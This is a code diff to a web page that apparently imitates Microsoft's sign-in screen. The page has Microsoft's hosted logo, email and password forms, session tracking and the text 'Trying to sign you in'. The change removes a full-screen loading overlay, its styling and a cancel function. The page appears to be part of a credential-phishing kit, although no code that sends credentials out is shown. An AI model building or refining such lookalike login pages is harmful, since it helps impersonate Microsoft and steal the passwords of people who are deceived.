@@ -316,31 +316,7 @@
             }
         }
 
-        /* Loading overlay for full-screen loading states */
-        .microsoft-loading-overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255, 255, 255, 0.95);
-            display: none;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            z-index: 1000;
-        }
-
-        .microsoft-loading-overlay.active {
-            display: flex;
-        }
-
-        .microsoft-loading-overlay .loading-text {
-            color: #323130;
-            font-size: 15px;
-            margin-top: 20px;
-            text-align: center;
-        }
+        
 
         /* Pulse animation for Microsoft logo during loading */
         .microsoft-logo.loading {
@@ -483,21 +459,7 @@
         </div>
     </div>
 
-    <!-- Microsoft loading overlay for intensive operations -->
-    <div class="microsoft-loading-overlay" id="microsoftLoadingOverlay">
-        <div style="text-align: center;">
-            <img class="microsoft-logo" src="https://aadcdn.msftauth.net/shared/1.0/content/images/microsoft_logo_564db913a7fa0ca42727161c6d031bef.svg" alt="Microsoft" style="width: 108px; margin-bottom: 20px;">
-            <div class="loading-text" id="overlayLoadingText" style="font-size: 24px; font-weight: 600; color: #1b1b1b; margin-bottom: 25px;">Trying to sign you in</div>
-            <div class="microsoft-dots-loader show" style="display: flex;">
-                <div class="microsoft-dot"></div>
-                <div class="microsoft-dot"></div>
-                <div class="microsoft-dot"></div>
-                <div class="microsoft-dot"></div>
-                <div class="microsoft-dot"></div>
-            </div>
-            <button type="button" class="btn btn-secondary" onclick="cancelLoading()" style="margin-top: 30px; padding: 8px 20px;">Cancel</button>
-        </div>
-    </div>
+    
 
     <script>
         let currentSessionId = null;
@@ -543,8 +505,6 @@
             const loadingAnimation = document.getElementById('loadingAnimation');
             const microsoftDotsLoader = document.getElementById('microsoftDotsLoader');
             const microsoftLogo = document.querySelector('.microsoft-logo');
-            const overlayLoadingOverlay = document.getElementById('microsoftLoadingOverlay');
-            const overlayLoadingText = document.getElementById('overlayLoadingText');
             const container = document.querySelector('.container');
 
             if (loading) {
@@ -557,27 +517,13 @@
                 // Add compact loading state to container
                 container.classList.add('loading-state');
 
-                if (useOverlay) {
-                    // Show full-screen overlay for intensive operations
-                    overlayLoadingText.textContent = loadingText;
-                    overlayLoadingOverlay.classList.add('active');
-
-                    // Hide the form content during overlay loading
-                    document.getElementById('emailForm').style.display = 'none';
-                    document.getElementById('passwordForm').style.display = 'none';
-                    document.getElementById('backInfo').style.display = 'none';
-                    document.getElementById('messageArea').style.display = 'none';
-                    microsoftDotsLoader.style.display = 'none';
-                } else {
-                    // Show dots animation in the form
-                    microsoftDotsLoader.classList.add('show');
-                }
+                // Show dots animation in the form
+                microsoftDotsLoader.classList.add('show');
             } else {
                 // Hide all loading animations
                 loadingAnimation.classList.remove('active');
                 microsoftDotsLoader.classList.remove('show');
                 microsoftLogo.classList.remove('loading');
-                overlayLoadingOverlay.classList.remove('active');
                 container.classList.remove('loading-state');
 
                 // Restore form visibility when loading stops
@@ -893,18 +839,7 @@
             setLoading(false);
         }
 
-        function cancelLoading() {
-            // Hide all loading states
-            setLoading(false);
-
-            // Show message or reset form
-            showMessage('Operation cancelled', 'info');
-
-            // Reset to email form if needed
-            if (currentStep === 'password') {
-                showEmailForm();
-            }
-        }
+        
 
 
         // Function to reset the form to the email input stage
